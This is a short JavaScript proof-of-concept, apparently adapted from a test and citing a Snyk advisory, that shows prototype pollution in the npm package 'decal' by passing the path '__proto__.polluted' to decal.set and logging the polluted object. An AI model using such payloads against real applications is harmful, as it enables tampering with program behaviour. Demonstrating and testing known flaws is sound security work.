// //https://security.snyk.io/vuln/SNYK-JS-DECAL-1051007
// test("prototype pollution in decal", () => {
  const decal = require("decal");

console.log({}.polluted);
  decal.set({}, "__proto__.polluted", "yes");
console.log({}.polluted);
// });
